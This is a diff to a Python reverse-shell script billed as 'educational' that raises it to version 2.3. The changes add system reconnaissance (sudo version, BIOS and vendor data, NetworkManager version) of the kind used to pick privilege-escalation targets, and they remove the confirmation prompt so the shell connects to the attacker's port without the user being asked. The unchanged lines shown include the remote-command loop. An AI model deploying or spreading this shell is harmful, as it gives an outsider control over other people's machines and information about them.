@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 # Advanced Reverse Shell (Educational Purposes Only)
+# Highly Elite Reverse Shell (Strongest more than metasploit payloads!)
+# Tested on : Debian 14.2.0-16 (Linux)
 # Author: Hamza Mahmoud (bugbounty88)
-# Modified Date: 18/7/2025
-# Last Version : 2.1
+# Modified Data 18/7/2025
+# Last Version : 2.3
 
 import socket
 import time
@@ -29,7 +31,7 @@ class Config:
     PORT = 4444         # Change this to attacker's PORT
     RECONNECT_DELAY = 5  # Seconds between connection attempts
     BUFFER_SIZE = 1024 * 4  # Data packet size
-    USE_SSL = False  # Enable for encrypted connection
+    USE_SSL = False  # Enable for encrypted connection (Still in test - don't use it now)
     SSL_CERT = None  # Path to SSL certificate (if used)
 
 # ========== System Information Gathering ==========
@@ -38,7 +40,13 @@ def get_system_info():
         "user": subprocess.getoutput("whoami"),
         "permissions": subprocess.getoutput("id"),
         "kernel": subprocess.getoutput("uname -r"),
+        "sudo_version": subprocess.getoutput("sudo --version | grep 'Sudo version '"),
         "os": platform.platform(),
+        "execution_dir": subprocess.getoutput("pwd"),
+        "language": subprocess.getoutput("echo $LANG"),
+        "bios_version": subprocess.getoutput("cat /sys/devices/virtual/dmi/id/bios_version"),
+        "computer_vendor": subprocess.getoutput("cat /sys/devices/virtual/dmi/id/board_vendor"),
+        "networkmanger_version": subprocess.getoutput("NetworkManager --version"),
         "hostname": socket.gethostname(),
         "python_version": sys.version,
     }
@@ -104,6 +112,7 @@ class ReverseShell:
         while self.connection_active:
             try:
                 command = self.socket.recv(Config.BUFFER_SIZE).decode().strip()
+                
                 if command.lower() in ["exit", "quit"]:
                     self.connection_active = False
                     self.socket.close()
@@ -159,9 +168,9 @@ class ReverseShell:
             print("[-] Session closed or may connection failed.")
             time.sleep(1)
 
-input("Press Enter to continue or Ctrl+C to cancel...")
 
 # ========== Main Execution ==========
 if __name__ == "__main__":
+    os.system("clear")
     shell = ReverseShell()
     shell.start()
